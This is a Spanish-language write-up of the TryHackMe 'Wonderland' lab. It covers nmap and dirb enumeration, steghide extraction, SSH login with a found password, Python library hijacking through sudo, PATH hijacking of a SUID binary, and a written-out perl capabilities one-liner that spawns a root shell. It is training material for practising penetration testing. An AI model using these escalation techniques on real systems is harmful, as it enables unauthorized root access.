---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Medium
  - HTTP
  - FuzzingWeb
  - SSH
  - PrivilegeEscalation
  - Sudo
  - Hijacking
  - Capabilities
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#SSH|SSH]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]
		- [[#Escalada de Privilegios#Capabilities|Capabilities]]

---
# Resolviendo la máquina Wonderland

>En esta publicación, comparto cómo resolví la máquina **Wonderland** de [TryHackMe](https://tryhackme.com/room/wonderland).

---
## Enumeración
### Ping

`ping -c 1 10.10.158.175`

![[Pasted image 20250809191402.png]]

*TTL=63/64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.158.175 -oG allPorts`

![[Pasted image 20250809191512.png]]

`nmap -p22,80 -sCV 10.10.158.175 -oN targeted`

![[Pasted image 20250809191528.png]]
### HTTP

`http://10.10.158.175`

![[Pasted image 20250809191615.png]]
#### Fuzzing Web

`dirb http://10.10.158.175`

![[Pasted image 20250809191803.png]]

`http://10.10.158.175/img/`

![[Pasted image 20250809191859.png]]

`wget http://10.10.158.175/img/alice_door.jpg`

`steghide extract -sf alice_door.jpg`

![[Pasted image 20250809192000.png]]

`wget http://10.10.158.175/img/white_rabbit_1.jpg`

`steghide extract -sf white_rabbit_1.jpg`

![[Pasted image 20250809192025.png]]

`wget http://10.10.158.175/img/alice_door.png`

`steghide extract -sf alice_door.png`

![[Pasted image 20250809192100.png]]

Se visualiza el archivo *.txt*, extraído de `white_rabbit_1.jpg`.

`cat hint.txt`

![[Pasted image 20250809192126.png]]

Se observa en el *fuzzing web*, que se encuentra un directorio `http://10.10.158.175/r/`. Con la pista que nos dan, se sobreentiende que es la palabra `rabbit`.

`http://10.10.158.175/r/`

![[Pasted image 20250809192402.png]]

`http://10.10.158.175/r/a/`

![[Pasted image 20250809192428.png]]

`http://10.10.158.175/r/a/b/`

![[Pasted image 20250809192445.png]]

`http://10.10.158.175/r/a/b/b/`

![[Pasted image 20250809192501.png]]

`http://10.10.158.175/r/a/b/b/i/`

![[Pasted image 20250809192524.png]]

`http://10.10.158.175/r/a/b/b/i/t/`

![[Pasted image 20250809192542.png]]

![[Pasted image 20250809192714.png]]

Se encontró la contraseña del usuario `alice`.

---
## Explotación
### SSH

`ssh alice@10.10.158.175`

Se busca la *flag* del usuario. Se encuentra en el directorio `/root/user.txt`.

`cat /root/user.txt`

![[Pasted image 20250809193044.png]]
### Escalada de Privilegios
#### Sudo

`sudo -l`

![[Pasted image 20250809193158.png]]

Se encuentra el binario: `/usr/bin/python`, se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid).

![[Pasted image 20250809193705.png]]

`cd /home/alice`

`ls -la `

![[Pasted image 20250809193257.png]]

`cat walrus_and_the_carpenter.py`

![[Pasted image 20250809193402.png]]

Se crea el archivo: `random.py`.

`cat random.py`

![[Pasted image 20250809193458.png]]

`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

![[Pasted image 20250809193730.png]]

`ls`

![[Pasted image 20250809193841.png]]

`/teaParty`

![[Pasted image 20250809194211.png]]

`python3 -m http.server 5000`

`wget http://10.10.158.175:5000/teaParty`

`strings teaParty`

![[Pasted image 20250809194057.png]]

`nano date`

`cat date`

![[Pasted image 20250809194133.png]]

`chmod 777 date`

`export PATH=.:$PATH`

`./teaParty`

![[Pasted image 20250809194254.png]]

![[Pasted image 20250809194311.png]]

`id`

![[Pasted image 20250809194548.png]]

`cd /home/hatter`

`ls`

![[Pasted image 20250809194330.png]]

`cat password.txt`

![[Pasted image 20250809194429.png]]

#### Capabilities

`getcap -r / 2>/dev/null`

![[Pasted image 20250809194504.png]]

Se encuentra el binario: `/usr/bin/perl`, se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities).

![[Pasted image 20250809194740.png]]

`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

![[Pasted image 20250809194809.png]]

`cd /home/alice`

`cat root.txt`

![[Pasted image 20250809194929.png]]

---



